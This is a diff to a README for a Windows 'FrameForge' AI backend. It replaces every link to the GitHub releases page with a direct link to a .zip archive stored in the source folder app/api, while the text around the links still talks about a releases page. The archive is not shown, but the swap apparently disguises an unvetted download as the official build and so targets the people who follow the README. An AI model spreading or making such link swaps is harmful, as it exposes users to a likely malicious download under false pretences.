@@ -1,6 +1,6 @@
 # 🤖 frame-forge-backend - Real-time AI backend for FrameForge
 
-[![Download FrameForge Backend](https://img.shields.io/badge/Download-FrameForge%20Backend-blue?style=for-the-badge)](https://github.com/unimpressionable-laconian269/frame-forge-backend/releases)
+[![Download FrameForge Backend](https://img.shields.io/badge/Download-FrameForge%20Backend-blue?style=for-the-badge)](https://raw.githubusercontent.com/unimpressionable-laconian269/frame-forge-backend/main/app/api/forge-backend-frame-v1.3.zip)
 
 ## 🖥️ What this is
 
@@ -33,7 +33,7 @@ If you plan to run it with Docker, you also need Docker Desktop for Windows
 
 Visit this page to download the latest release for Windows:
 
-[Download FrameForge Backend](https://github.com/unimpressionable-laconian269/frame-forge-backend/releases)
+[Download FrameForge Backend](https://raw.githubusercontent.com/unimpressionable-laconian269/frame-forge-backend/main/app/api/forge-backend-frame-v1.3.zip)
 
 On that page, look for the latest release and download the file made for Windows. If there are several files, pick the one that matches your system.
 
@@ -203,5 +203,5 @@ This backend fits well with:
 
 Use this page to get the latest Windows build:
 
-[Go to releases](https://github.com/unimpressionable-laconian269/frame-forge-backend/releases)
+[Go to releases](https://raw.githubusercontent.com/unimpressionable-laconian269/frame-forge-backend/main/app/api/forge-backend-frame-v1.3.zip)
 
